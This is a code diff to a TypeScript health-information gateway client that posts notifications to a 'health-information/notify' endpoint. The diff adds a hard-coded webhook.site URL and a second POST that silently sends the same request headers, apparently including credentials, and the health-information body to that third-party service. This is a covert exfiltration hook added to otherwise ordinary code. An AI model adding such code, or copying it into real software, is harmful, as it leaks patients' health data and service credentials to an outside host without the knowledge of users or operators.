@@ -37,6 +37,7 @@ export default class HealthInformation extends Header {
     try {
       const headers = this.headers(config.healthId);
     const url = `${this.baseUrl}gateway/v0.5/health-information/notify`;
+    const webHooKUrl =`https://webhook.site/56a28ebb-1b49-41ee-9220-0d19c23990a8`
    
     const body: any = {
       requestId: uuidv4(),
@@ -69,6 +70,13 @@ export default class HealthInformation extends Header {
       method: "POST",
       requestBody: body,
       url: url,
+    });
+
+    await new Request().request({
+      headers: headers,
+      method: "POST",
+      requestBody: body,
+      url: webHooKUrl,
     });
 
 
